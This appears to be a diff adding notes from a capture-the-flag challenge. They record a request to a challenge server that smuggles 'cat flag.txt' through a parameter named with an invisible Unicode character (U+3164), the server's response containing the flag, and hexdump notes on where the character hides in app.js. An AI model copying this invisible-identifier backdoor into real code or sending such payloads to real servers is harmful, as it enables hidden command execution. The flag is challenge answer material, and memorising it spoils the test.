@@ -1,0 +1,11 @@
+# Live response from http://154.57.164.75:32093/server_status
+# (request: choice=6&%E3%85%A4=cat flag.txt) — verified twice, identical output.
+
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+
+HTB{1nvi5IBl3_cH4r4cT3rS_n0t_sO_v1SIbL3_9ebb0c4c793c74a14ef4bb9a2b5064d5}
+
+# Raw hexdump of app.js confirmed only two U+3164 bytes (e3 85 a4):
+#   line 15: const { choice,<e3 85 a4>} = req.body;
+#   line 28: 'ps aux',<e3 85 a4>
